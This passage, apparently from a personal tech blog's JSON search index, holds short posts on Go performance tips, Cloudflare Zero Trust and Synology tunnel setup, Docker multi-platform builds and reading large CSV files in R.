\u003ccode\u003esync.WaitGroup\u003c/code\u003e 来同步分片操作\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e避免在热代码中进行内存分配，这样会导致 gc 很忙。尽可能的使用 \u003ccode\u003esync.Pool\u003c/code\u003e 来重用对象。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e使用 lock-free 的操作，避免使用 mutex，尽可能使用 \u003ccode\u003esync/Atomic\u003c/code\u003e 包。 （关于无锁编程的相关话题，可参看《\u003ca href=\"https://coolshell.cn/articles/8239.html\" target=\"_blank\" rel=\"noopener\"\u003e无锁队列实现\u003c/a\u003e》或《\u003ca href=\"https://coolshell.cn/articles/9703.html\" target=\"_blank\" rel=\"noopener\"\u003e无锁 Hashmap 实现\u003c/a\u003e》）\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e使用 I/O 缓冲，I/O 是个非常非常慢的操作，使用 \u003ccode\u003ebufio.NewWrite()\u003c/code\u003e 和 \u003ccode\u003ebufio.NewReader()\u003c/code\u003e 可以带来更高的性能。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e对于在 for-loop 里的固定的正则表达式，一定要使用 \u003ccode\u003eregexp.Compile()\u003c/code\u003e 编译正则表达式。性能会得升两个数量级。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e如果你需要更高性能的协议，你要考虑使用 \u003ca href=\"https://github.com/golang/protobuf\" target=\"_blank\" rel=\"noopener\"\u003eprotobuf\u003c/a\u003e 或 \u003ca href=\"https://github.com/tinylib/msgp\" target=\"_blank\" rel=\"noopener\"\u003emsgp\u003c/a\u003e 而不是 JSON，因为 JSON 的序列化和反序列化里使用了反射。\u003c/p\u003e","tags":["Go","URL"],"title":"Golang tips"},{"categories":["chart","data","visualization","URL"],"contents":" https://datavizproject.com ","date":"September 26, 2023","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2023/20230926-datavizproject/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://datavizproject.com\" target=\"_blank\" rel=\"noopener\"\u003ehttps://datavizproject.com\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["chart","data","visualization","URL"],"title":"datavizproject"},{"categories":["travel","checklist","URL"],"contents":" https://travel-questions.gnehs.net/ ","date":"September 26, 2023","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2023/20230926-checklist/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://travel-questions.gnehs.net/\" target=\"_blank\" rel=\"noopener\"\u003ehttps://travel-questions.gnehs.net/\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["travel","checklist","URL"],"title":"朋友旅行防止絕交檢查表"},{"categories":["Cloudflare","zero trust"],"contents":" Connect private networks Configure Local Domain Fallback Configure Split Tunnels Traffic routing with WARP 1. Set up the client Create device enrollment rules Create device enrollment rules to determine which devices can enroll to Zero Trust organization.\nSet device enrollment permissions In Zero Trust, go to Settings \u0026gt; WARP Client \u0026gt; Device enrollment \u0026gt; Device enrollment permissions \u0026gt; Manage. Rules \u0026gt; Policies \u0026gt; Add a rule \u0026gt; Include \u0026gt; Selector \u0026gt; Emails ending in \u0026gt; Value \u0026gt; @ruru910.com. 2. Route private network IPs through WARP In Zero Trust, go to Settings \u0026gt; WARP Client \u0026gt; Device settings \u0026gt; Profile settings \u0026gt; Profile name \u0026gt; Default \u0026gt; Configure. Configure settings: Enabled: Captive portal detection, Mode switch, Allow device to leave organization, Allow updates. Service mode: Gateway with WARP. Local Domain Fallback \u0026gt; Manage \u0026gt; Domain \u0026gt; nas.ruru910.com. Split Tunnels: Exclude IPs and domains \u0026gt; Manage. Delete the IP range of nas.ruru910.com. 3. Filter network traffic with Gateway 1. Enable the Gateway proxy In Zero Trust, go to Settings \u0026gt; Network. Gateway Logging: Capture all. Firewall: Proxy(TCP, UDP, ICMP), WARP to WARP, AV inspection. 2. Create Zero Trust policies Go to Access \u0026gt; Applications \u0026gt; Add an application \u0026gt; Private Network \u0026gt; Application Type \u0026gt; Destination IP. For Value, enter the IP address for your application (for example, 10.128.0.7). Modify policy \u0026gt; identify \u0026gt; Selector \u0026gt; User Email \u0026gt; in \u0026gt; @ruru910.com. ","date":"September 26, 2023","hero":"/images/hero/cloudflare.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2023/20230926-cloudflare/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/private-net/connect-private-networks/\" target=\"_blank\" rel=\"noopener\"\u003eConnect private networks\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://developers.cloudflare.com/cloudflare-one/connections/connect-devices/warp/configure-warp/route-traffic/local-domains/\" target=\"_blank\" rel=\"noopener\"\u003eConfigure Local Domain Fallback\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://developers.cloudflare.com/cloudflare-one/connections/connect-devices/warp/exclude-traffic/split-tunnels/\" target=\"_blank\" rel=\"noopener\"\u003eConfigure Split Tunnels\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://developers.cloudflare.com/cloudflare-one/connections/connect-devices/warp/exclude-traffic/\" target=\"_blank\" rel=\"noopener\"\u003eTraffic routing with WARP\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"1-set-up-the-client\"\u003e1. Set up the client\u003c/h3\u003e\n\u003ch4 id=\"create-device-enrollment-rules\"\u003eCreate device enrollment rules\u003c/h4\u003e\n\u003cblockquote\u003e\n\u003cp\u003eCreate device enrollment rules to determine which devices can enroll to Zero Trust organization.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch5 id=\"set-device-enrollment-permissions\"\u003eSet device enrollment permissions\u003c/h5\u003e\n\u003col\u003e\n\u003cli\u003eIn Zero Trust, go to Settings \u0026gt; WARP Client \u0026gt; Device enrollment \u0026gt; Device enrollment permissions \u0026gt; Manage.\u003c/li\u003e\n\u003cli\u003eRules \u0026gt; Policies \u0026gt; Add a rule \u0026gt; Include \u0026gt; Selector \u0026gt; Emails ending in \u0026gt; Value \u0026gt; @ruru910.com.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"2-route-private-network-ips-through-warp\"\u003e2. Route private network IPs through WARP\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eIn Zero Trust, go to Settings \u0026gt; WARP Client \u0026gt; Device settings \u0026gt; Profile settings \u0026gt; Profile name \u0026gt; Default \u0026gt; Configure.\u003c/li\u003e\n\u003cli\u003eConfigure settings:\n\u003col\u003e\n\u003cli\u003eEnabled: Captive portal detection, Mode switch, Allow device to leave organization, Allow updates.\u003c/li\u003e\n\u003cli\u003eService mode: Gateway with WARP.\u003c/li\u003e\n\u003cli\u003eLocal Domain Fallback \u0026gt; Manage \u0026gt; Domain \u0026gt; nas.ruru910.com.\u003c/li\u003e\n\u003cli\u003eSplit Tunnels: Exclude IPs and domains \u0026gt; Manage.\n\u003cul\u003e\n\u003cli\u003eDelete the IP range of nas.ruru910.com.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"3-filter-network-traffic-with-gateway\"\u003e3. Filter network traffic with Gateway\u003c/h3\u003e\n\u003ch4 id=\"1-enable-the-gateway-proxy\"\u003e1. Enable the Gateway proxy\u003c/h4\u003e\n\u003col\u003e\n\u003cli\u003eIn Zero Trust, go to Settings \u0026gt; Network.\n\u003col\u003e\n\u003cli\u003eGateway Logging: Capture all.\u003c/li\u003e\n\u003cli\u003eFirewall: Proxy(TCP, UDP, ICMP), WARP to WARP, AV inspection.\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch4 id=\"2-create-zero-trust-policies\"\u003e2. \u003ca href=\"https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/private-net/connect-private-networks/#create-zero-trust-policies\" target=\"_blank\" rel=\"noopener\"\u003eCreate Zero Trust policies\u003c/a\u003e\u003c/h4\u003e\n\u003col\u003e\n\u003cli\u003eGo to Access \u0026gt; Applications \u0026gt; Add an application \u0026gt; Private Network \u0026gt; Application Type \u0026gt; Destination IP.\u003c/li\u003e\n\u003cli\u003eFor Value, enter the IP address for your application (for example, 10.128.0.7).\u003c/li\u003e\n\u003cli\u003eModify policy \u0026gt; identify \u0026gt; Selector \u0026gt; User Email \u0026gt; in \u0026gt; @ruru910.com.\u003c/li\u003e\n\u003c/ol\u003e","tags":["Cloudflare","zero trust"],"title":"Cloudflare Zero Trust"},{"categories":["Cloudflare","Synology"],"contents":" CLOUDFLARE tunnel on SYNOLOGY. (the raw way) Setup Synology Create a directory in docker directory, such as cloudflare-tunnel. Download cloudflared/cloudflared image to registry. ssh to admin@synology Change cloudflare-tunnel owner, sudo chown -R 65532:65532 /volume1/docker/cloudflare-tunnel. Run containers - cloudflared tunnel login Run container and mount volume docker/cloudflare-tunnel:/home/nonroot/.cloudflared. Select Use the same network as Docker Host in network tab. Add command tunnel login in envorinment tab. Go to container log, and copy login url. Paste url to browser and authorize the zone. Export the container setting json to the directory cloudflare-tunnel. - cloudflared tunnel create synology-tunnel Edit the container setting json in the the directory cloudflare-tunnel, modify cmd. tunnel create synology-tunnel. Import the container setting json and run a new container. The container will stop and create tunnel config json in cloudflare-tunnel. Create config.yml and write ingress rules. In config.yml, tunnel value is the same as the tunnel config json name, and credentials-file is /home/nonroot/.cloudflared/tunnel config json Export the second container setting json to the directory cloudflare-tunnel. - cloudflared tunnel route dns synology-tunnel synology.ruru910.com Edit the second container setting json in the the directory cloudflare-tunnel, modify cmd. tunnel route dns synology-tunnel synology.ruru910.com. Import the second container setting json and run a new container. The container will stop and create a dns record mapping domain to the tunnel. - cloudflared tunnel run synology-tunnel Edit the second container setting json in the the directory cloudflare-tunnel, modify cmd. tunnel run synology-tunnel. Import the second container setting json and run a new container. The tunnel now is connectable. ","date":"September 25, 2023","hero":"/images/hero/cloudflare.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2023/20230925-cloudflare/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.youtube.com/watch?v=5IrtNxfzH1o\" target=\"_blank\" rel=\"noopener\"\u003eCLOUDFLARE tunnel on SYNOLOGY. (the raw way)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"setup-synology\"\u003eSetup Synology\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003eCreate a directory in docker directory, such as \u003ccode\u003ecloudflare-tunnel\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eDownload cloudflared/cloudflared image to registry.\u003c/li\u003e\n\u003cli\u003essh to admin@synology\u003c/li\u003e\n\u003cli\u003eChange \u003ccode\u003ecloudflare-tunnel\u003c/code\u003e owner, \u003ccode\u003esudo chown -R 65532:65532 /volume1/docker/cloudflare-tunnel\u003c/code\u003e.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"run-containers\"\u003eRun containers\u003c/h3\u003e\n\u003ch4 id=\"--cloudflared-tunnel-login\"\u003e- \u003ccode\u003ecloudflared tunnel login\u003c/code\u003e\u003c/h4\u003e\n\u003col\u003e\n\u003cli\u003eRun container and mount volume \u003ccode\u003edocker/cloudflare-tunnel:/home/nonroot/.cloudflared\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eSelect \u003ccode\u003eUse the same network as Docker Host\u003c/code\u003e in network tab.\u003c/li\u003e\n\u003cli\u003eAdd command \u003ccode\u003etunnel login\u003c/code\u003e in envorinment tab.\u003c/li\u003e\n\u003cli\u003eGo to container log, and copy login url.\u003c/li\u003e\n\u003cli\u003ePaste url to browser and authorize the zone.\u003c/li\u003e\n\u003cli\u003eExport the container setting json to the directory \u003ccode\u003ecloudflare-tunnel\u003c/code\u003e.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch4 id=\"--cloudflared-tunnel-create-synology-tunnel\"\u003e- \u003ccode\u003ecloudflared tunnel create synology-tunnel\u003c/code\u003e\u003c/h4\u003e\n\u003col\u003e\n\u003cli\u003eEdit the container setting json in the the directory \u003ccode\u003ecloudflare-tunnel\u003c/code\u003e, modify cmd. \u003ccode\u003etunnel create synology-tunnel\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eImport the container setting json and run a new container.\u003c/li\u003e\n\u003cli\u003eThe container will stop and create tunnel config json in \u003ccode\u003ecloudflare-tunnel\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eCreate config.yml and write ingress rules.\u003c/li\u003e\n\u003cli\u003eIn config.yml, tunnel value is the same as the tunnel config json name, and credentials-file is \u003ccode\u003e/home/nonroot/.cloudflared/tunnel config json\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eExport the second container setting json to the directory \u003ccode\u003ecloudflare-tunnel\u003c/code\u003e.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch4 id=\"--cloudflared-tunnel-route-dns-synology-tunnel-synologyruru910com\"\u003e- \u003ccode\u003ecloudflared tunnel route dns synology-tunnel synology.ruru910.com\u003c/code\u003e\u003c/h4\u003e\n\u003col\u003e\n\u003cli\u003eEdit the second container setting json in the the directory \u003ccode\u003ecloudflare-tunnel\u003c/code\u003e, modify cmd. \u003ccode\u003etunnel route dns synology-tunnel synology.ruru910.com\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eImport the second container setting json and run a new container.\u003c/li\u003e\n\u003cli\u003eThe container will stop and create a dns record mapping domain to the tunnel.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch4 id=\"--cloudflared-tunnel-run-synology-tunnel\"\u003e- \u003ccode\u003ecloudflared tunnel run synology-tunnel\u003c/code\u003e\u003c/h4\u003e\n\u003col\u003e\n\u003cli\u003eEdit the second container setting json in the the directory \u003ccode\u003ecloudflare-tunnel\u003c/code\u003e, modify cmd. \u003ccode\u003etunnel run synology-tunnel\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eImport the second container setting json and run a new container.\u003c/li\u003e\n\u003cli\u003eThe tunnel now is connectable.\u003c/li\u003e\n\u003c/ol\u003e","tags":["Cloudflare","tunnel","Synology"],"title":"Cloudflare tunnel on Synology"},{"categories":["URL","Go"],"contents":" Go Patterns go-design-pattern ","date":"September 16, 2023","hero":"/images/hero/go.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2023/20230916-go-patterns/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/tmrts/go-patterns\" target=\"_blank\" rel=\"noopener\"\u003eGo Patterns\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/mohuishou/go-design-pattern\" target=\"_blank\" rel=\"noopener\"\u003ego-design-pattern\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Go"],"title":"Go Patterns"},{"categories":["URL","Docker"],"contents":" Faster Multi-Platform Builds: Dockerfile Cross-Compilation Guide method docker buildx create --use FROM --platform=linux/amd64 debian / FROM --platform=$BUILDPLATFORM debian variables BUILDPLATFORM — matches the current machine. (e.g. linux/amd64) BUILDOS — os component of BUILDPLATFORM, e.g. linux BUILDARCH — e.g. amd64, arm64, riscv64 BUILDVARIANT — used to set ARM variant, e.g. v7 TARGETPLATFORM — The value set with --platform flag on build TARGETOS - OS component from --platform, e.g. linux TARGETARCH - Architecture from --platform, e.g. arm64 TARGETVARIANT example before FROM golang:1.17-alpine AS build WORKDIR /src COPY . . RUN go build -o /out/myapp . FROM alpine COPY --from=build /out/myapp /bin after FROM --platform=$BUILDPLATFORM golang:1.17-alpine AS build WORKDIR /src ARG TARGETOS TARGETARCH RUN --mount=target=. \\ --mount=type=cache,target=/root/.cache/go-build \\ --mount=type=cache,target=/go/pkg \\ GOOS=$TARGETOS GOARCH=$TARGETARCH go build -o /out/myapp . FROM alpine COPY --from=build /out/myapp /bin ","date":"September 4, 2023","hero":"/images/hero/docker.jpeg","permalink":"https://linzeyan.github.io/zh-tw/posts/2023/20230904-faster-multi-platform-builds-dockerfile-cross-compilation-guide/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.docker.com/blog/faster-multi-platform-builds-dockerfile-cross-compilation-guide/\" target=\"_blank\" rel=\"noopener\"\u003eFaster Multi-Platform Builds: Dockerfile Cross-Compilation Guide\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"method\"\u003emethod\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003edocker buildx create --use\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eFROM --platform=linux/amd64 debian\u003c/code\u003e / \u003ccode\u003eFROM --platform=$BUILDPLATFORM debian\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003evariables\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eBUILDPLATFORM — matches the current machine. (e.g. linux/amd64)\n\nBUILDOS — os component of BUILDPLATFORM, e.g. linux\n\nBUILDARCH — e.g. amd64, arm64, riscv64\n\nBUILDVARIANT — used to set ARM variant, e.g. v7\n\nTARGETPLATFORM — The value set with --platform flag on build\n\nTARGETOS - OS component from --platform, e.g. linux\n\nTARGETARCH - Architecture from --platform, e.g. arm64\n\nTARGETVARIANT\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"example\"\u003eexample\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003ebefore\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-dockerfile\" data-lang=\"dockerfile\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eFROM\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e golang:1.17-alpine AS build\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eWORKDIR\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e /src\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eCOPY\u003c/span\u003e . .\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eRUN\u003c/span\u003e go build -o /out/myapp .\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eFROM\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e alpine\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eCOPY\u003c/span\u003e --from\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ebuild /out/myapp /bin\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eafter\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-dockerfile\" data-lang=\"dockerfile\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eFROM\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e --platform=$BUILDPLATFORM golang:1.17-alpine AS build\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eWORKDIR\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e /src\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eARG\u003c/span\u003e TARGETOS TARGETARCH\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eRUN\u003c/span\u003e --mount\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003etarget\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e. \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --mount\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003etype\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ecache,target\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/root/.cache/go-build \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --mount\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003etype\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ecache,target\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/go/pkg \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    GOOS\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e$TARGETOS GOARCH\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e$TARGETARCH go build -o /out/myapp .\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eFROM\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e alpine\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eCOPY\u003c/span\u003e --from\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ebuild /out/myapp /bin\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Docker"],"title":"Faster Multi-Platform Builds: Dockerfile Cross-Compilation Guide"},{"categories":["URL","R"],"contents":" How to deal with a 50GB large csv file in r language? question all \u0026lt;- read.csv.ffdf( file=\u0026#34;\u0026lt;path of large file\u0026gt;\u0026#34;, sep = \u0026#34;,\u0026#34;, header=TRUE, VERBOSE=TRUE, first.rows=10000, next.rows=50000, ) answer library(sqldf) iris2 \u0026lt;- read.csv.sql(\u0026#34;iris.csv\u0026#34;, sql = \u0026#34;select * from file where Species = \u0026#39;setosa\u0026#39; \u0026#34;) ","date":"July 20, 2023","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2023/20230720-how-to-deal-with-a-50gb-large-csv-file-in-r-language/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://stackoverflow.com/questions/39678940/how-to-deal-with-a-50gb-large-csv-file-in-r-language\" target=\"_blank\" rel=\"noopener\"\u003eHow to deal with a 50GB large csv file in r language?\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"question\"\u003equestion\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-r\" data-lang=\"r\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eall \u003cspan style=\"color:#f92672\"\u003e\u0026lt;-\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eread.csv.ffdf\u003c/span\u003e(\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  file\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026lt;path of large file\u0026gt;\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  sep \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;,\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  header\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eTRUE\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  VERBOSE\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eTRUE\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  first.rows\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e10000\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  next.rows\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e50000\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  )\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"answer\"\u003eanswer\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-r\" data-lang=\"r\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003elibrary\u003c/span\u003e(sqldf)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eiris2 \u003cspan style=\"color:#f92672\"\u003e\u0026lt;-\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eread.csv.sql\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;iris.csv\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    sql \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;select * from file where Species = \u0026#39;setosa\u0026#39; 